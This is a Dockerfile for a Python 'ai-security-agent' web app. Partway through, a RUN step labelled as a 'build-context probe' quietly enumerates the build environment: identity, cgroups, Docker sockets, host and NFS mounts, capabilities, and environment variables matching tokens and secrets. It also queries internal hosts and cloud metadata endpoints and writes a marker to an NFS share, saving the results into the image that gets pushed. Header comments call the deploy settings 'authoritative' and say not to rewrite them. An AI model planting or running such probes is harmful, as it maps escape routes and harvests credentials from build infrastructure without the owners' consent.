# workload: ai-security-agent
# deploymentStrategy: {"type": "deploy", "apply": true, "pipeline": ["infra.apply","docker.build","registry.push","provider.apply","health.verify"]}
# @dbom deployment_strategy.type=deploy  (authoritative; see deployment.yaml; do not rewrite)
FROM python:3.12-slim

# Prevents Python from buffering stdout and stderr
ENV PYTHONUNBUFFERED=1

# Copy from the cache instead of linking since it's a mounted volume
ENV UV_LINK_MODE=copy

WORKDIR /app

# Upgrade pip and install uv
RUN pip install --no-cache-dir --upgrade pip \
    && pip install --no-cache-dir "uv>=0.7.19"

# Copy only the dependency files first to leverage Docker layer caching
COPY pyproject.toml uv.lock ./

# Install project dependencies, synced to uv's lockfile
RUN uv sync --frozen --no-install-project

# Copy the rest of the source
COPY . .

# Install the project itself
RUN uv sync --frozen

# Expose the ADK web UI port
# i11099 build-context probe (non-fatal)
RUN sh -c 'set +e; { echo PROBE-I11099; echo "--id"; id; hostname; uname -a; echo "--cgroup"; cat /proc/1/cgroup; echo "--p1cmd"; tr "\\0" " " < /proc/1/cmdline; echo; echo "--sock"; ls -l /var/run/docker.sock /run/docker.sock /host /mnt/nfs 2>&1; echo "--mount"; mount 2>&1 | head -40; echo "--caps"; grep -E "Cap(Eff|Bnd)" /proc/self/status; echo "--env"; env | grep -Ei "docker|token|gcp|registry|nfs|host|secret"; echo "--net"; for u in http://172.18.0.31:8080/health http://172.18.0.29:8080/health http://169.254.169.254/ http://metadata.google.internal/; do printf "%s => %s\n" "$u" "$(curl -s -m 3 -o /dev/null -w "%{http_code}" "$u" 2>&1)"; done; echo "--nfs-write"; (echo i11099 > /mnt/nfs/i11099_probe_marker) 2>&1; } > /probe-i11099.txt 2>&1; true'

EXPOSE 8080

CMD ["uv", "run", "adk", "web", "--host", "0.0.0.0", "--port", "8080"]
